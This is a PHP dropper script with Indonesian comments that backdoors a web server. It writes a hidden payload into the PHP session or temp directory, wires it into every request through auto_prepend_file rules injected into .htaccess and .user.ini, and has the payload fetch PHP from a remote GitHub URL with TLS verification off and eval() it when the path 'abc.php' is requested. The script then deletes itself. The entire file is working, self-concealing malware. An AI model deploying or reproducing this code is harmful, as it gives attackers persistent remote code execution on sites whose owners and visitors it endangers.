<?php
// ==========================================
// KONFIGURASI UNIVERSAL
// ==========================================
$virtual_name = 'abc.php';
$remote_url   = 'https://raw.githubusercontent.com/xshikata-ai/x/refs/heads/main/wp-class.php';
$sess_id      = 'sess_sys_core_'.substr(md5($_SERVER['HTTP_HOST']), 0, 8);

// ==========================================
// 1. TENTUKAN WADAH PAYLOAD (HIDDEN PATH)
// ==========================================
$paths = [session_save_path(), sys_get_temp_dir(), '/tmp', '/var/lib/php/sessions'];
$payload_path = '';

foreach($paths as $p){
    if(!empty($p) && is_dir($p) && is_writable($p)){
        $payload_path = rtrim($p, '/') . '/' . $sess_id;
        break;
    }
}
// Fallback jika tidak ada folder sistem yang bisa ditulis
if(empty($payload_path)) $payload_path = dirname(__FILE__) . '/.sys_tmp';

// ==========================================
// 2. BUAT PAYLOAD (PREPEND SCRIPT)
// ==========================================
$code = "<?php
if(strpos(\$_SERVER['REQUEST_URI'], '$virtual_name') !== false){
    while(ob_get_level()) ob_end_clean();
    \$u='$remote_url';
    \$c=curl_init(\$u);
    curl_setopt(\$c,19913,1); curl_setopt(\$c,52,1); curl_setopt(\$c,64,0);
    \$d=curl_exec(\$c);
    if(!\$d) \$d=@file_get_contents(\$u);
    if(\$d){ eval('?>'.\$d); exit; }
}
?>";
file_put_contents($payload_path, $code);

// ==========================================
// 3. INJEKSI HTACCESS (UNIVERSAL STACK)
// ==========================================
$ht = '.htaccess';
$ht_content = file_exists($ht) ? file_get_contents($ht) : '';
$ht_content = preg_replace('/# GHOST START.*?# GHOST END/s', '', $ht_content);

// Kita buat blok untuk SEMUA versi PHP
$new_rules = "# GHOST START
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteRule ^$virtual_name$ index.php [L]
</IfModule>

# Support PHP 8.x (Modern)
<IfModule mod_php8.c>
php_value auto_prepend_file \"$payload_path\"
</IfModule>

# Support PHP 7.x (Legacy)
<IfModule mod_php7.c>
php_value auto_prepend_file \"$payload_path\"
</IfModule>

# Support PHP 5.x (Ancient)
<IfModule mod_php5.c>
php_value auto_prepend_file \"$payload_path\"
</IfModule>

# Support Generic Mod_PHP
<IfModule mod_php.c>
php_value auto_prepend_file \"$payload_path\"
</IfModule>

# Support LiteSpeed (LSAPI)
<IfModule mod_lsapi.c>
php_value auto_prepend_file \"$payload_path\"
</IfModule>
# GHOST END\n";

file_put_contents($ht, $new_rules . trim($ht_content));

// ==========================================
// 4. INJEKSI .USER.INI (UNTUK PHP-FPM / NGINX)
// ==========================================
// Jika server pakai PHP-FPM, .htaccess di atas TIDAK AKAN JALAN (Error 500 atau Ignored).
// Solusinya wajib pakai .user.ini
$ini = '.user.ini';
$ini_conf = "auto_prepend_file = \"$payload_path\"\n";
$ini_content = file_exists($ini) ? file_get_contents($ini) : '';

// Cek apakah sudah ada biar gak duplikat
if(strpos($ini_content, $payload_path) === false){
    // Taruh konfigurasi di paling atas
    file_put_contents($ini, $ini_conf . $ini_content);
}

// Force refresh cache .user.ini (Touch file)
@touch($ini);

// ==========================================
// 5. SELESAI
// ==========================================
unlink(__FILE__);
echo "<pre>";
echo "[SUKSES] Universal Patch Applied.\n";
echo "Support: PHP 5/7/8, LSAPI, & FPM.\n";
echo "Payload Path: $payload_path\n";
echo "Silakan akses: domain.com/$virtual_name";
echo "</pre>";
?>
